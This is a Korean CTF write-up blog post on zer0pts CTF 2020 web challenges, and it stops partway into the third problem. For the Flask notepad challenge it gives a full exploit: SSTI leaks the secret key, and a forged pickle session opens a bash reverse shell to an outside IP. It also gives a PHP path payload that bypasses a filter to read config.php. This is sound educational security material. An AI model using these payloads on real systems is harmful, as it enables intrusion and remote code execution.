<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다. 1234git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.gitcd zer">
<meta property="og:type" content="article">
<meta property="og:title" content="zer0pts CTF 2020 Write Up">
<meta property="og:url" content="http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/index.html">
<meta property="og:site_name" content="Home">
<meta property="og:description" content="Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다. 1234git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.gitcd zer">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%2012.59.35.png?raw=true">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.12.42.png?raw=true">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.35.23.png?raw=true">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.54.19.png?raw=true">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.57.47.png?raw=true">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.25.19.png?raw=true">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.54.47.png?raw=true">
<meta property="article:published_time" content="2020-12-26T00:00:00.000Z">
<meta property="article:modified_time" content="2021-03-08T15:45:21.765Z">
<meta property="article:author" content="Jeongwon Jo">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="Python Pickle RCE">
<meta property="article:tag" content="REDIS">
<meta property="article:tag" content="Client Attack">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%2012.59.35.png?raw=true">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>zer0pts CTF 2020 Write Up</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/01/02/2021-01-02-SQL-Injection-Summary/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/12/19/2020-12-19-X-MAS-CTF-2020/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&text=zer0pts CTF 2020 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&is_video=false&description=zer0pts CTF 2020 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=zer0pts CTF 2020 Write Up&body=Check out this article: http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&title=zer0pts CTF 2020 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&name=zer0pts CTF 2020 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/12/26/2020-12-26-Zer0pts-CTF-2020/&t=zer0pts CTF 2020 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-notepad-332pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) notepad [332pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Can-you-guess-it-345pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) Can you guess it [345pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-urlapp-435pts"><span class="toc-number">3.</span> <span class="toc-text">(Web) urlapp [435pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-MusicBlog-653pts"><span class="toc-number">4.</span> <span class="toc-text">(Web) MusicBlog [653pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-phpNantoKaAdmin-755pts"><span class="toc-number">5.</span> <span class="toc-text">(Web) phpNantoKaAdmin [755pts]</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        zer0pts CTF 2020 Write Up
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Jeongwon Jo</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-12-26T00:00:00.000Z" itemprop="datePublished">2020-12-26</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Client-Attack/" rel="tag">Client Attack</a>, <a class="tag-link-link" href="/tags/Python-Pickle-RCE/" rel="tag">Python Pickle RCE</a>, <a class="tag-link-link" href="/tags/REDIS/" rel="tag">REDIS</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><strong>Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h3><p><strong>notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.</strong><br><br></p>
<p><b><em><span style="color:#631F9C">&#62;</span> SSTI Vuln</em></b></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure>
<p><strong>404 에러 페이지를 확인해보면 <code>Referer</code> 헤더를 가져와서 <code>URL</code> 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%2012.59.35.png?raw=true"><br><strong>그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 <code>session</code>을 마음대로 조작이 가능할 거 같습니다.</strong></p>
<p><b><em><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</em></b></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p><strong>/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 <code>savedata</code>라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.12.42.png?raw=true"><br><strong>Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.</strong><br><br></p>
<p><strong>그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<a href="int:id">int:id</a>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. </p>
<p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>   │ <span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"> <span class="number">2</span>   │ <span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"> <span class="number">3</span>   │ <span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"> <span class="number">4</span>   │</span><br><span class="line"> <span class="number">5</span>   │ cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"> <span class="number">6</span>   │ key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"> <span class="number">7</span>   │ <span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"> <span class="number">8</span>   │     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line"> <span class="number">9</span>   │         <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="number">10</span>   │</span><br><span class="line"><span class="number">11</span>   │ <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"><span class="number">12</span>   │     app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line"><span class="number">13</span>   │     app.secret_key = key_</span><br><span class="line"><span class="number">14</span>   │</span><br><span class="line"><span class="number">15</span>   │     sscsi = SecureCookieSessionInterface()</span><br><span class="line"><span class="number">16</span>   │     signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line"><span class="number">17</span>   │</span><br><span class="line"><span class="number">18</span>   │     session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line"><span class="number">19</span>   │     print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line"><span class="number">20</span>   │     requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"><span class="number">21</span>   │</span><br><span class="line"><span class="number">22</span>   │ <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">23</span>   │     print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line"><span class="number">24</span>   │     exploit()</span><br></pre></td></tr></table></figure>
<p><strong>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 <code>nc</code>를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 <code>bash -c</code>를 이용해서 쉘을 따주니 잘 되었습니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.35.23.png?raw=true"><br><strong>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</strong></p>
<p><code>FLAG : zer0pts&#123;fl4sk_s3ss10n_4nd_pyth0n_RCE&#125;</code></p>
<hr>
<h3 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h3><p><strong>Can you guess it 문제는 PHP 트릭류 문제입니다. </strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><b><em><span style="color:#631F9C">&#62;</span> analysis</em></b></p>
<p><strong>FLAG는 config.php에 정의가 되어 있다고 합니다.</strong><br><br></p>
<p><strong>코드를 보면 $_SERVER[‘PHP_SELF’]의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. $_SERVER[‘PHP_SELF’]는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>하지만 preg_match() 함수를 이용해서 $_SERVER[‘PHP_SELF’] 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 <code>config.php</code>가 필터링에 걸리기 때문에 힘들 거 같습니다.</strong><br><br></p>
<p><strong>그러다 구글링을 하다가 <a target="_blank" rel="noopener" href="https://ngaa.tistory.com/m/46?category=776250">여기서</a> 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure>
<p><strong>테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.</strong> </p>
<p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure>
<p><strong>위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.</strong></p>
<p><code>FLAG : zer0pts&#123;gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n&#125;</code></p>
<hr>
<h3 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h3><p><strong>urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다. </strong></p>
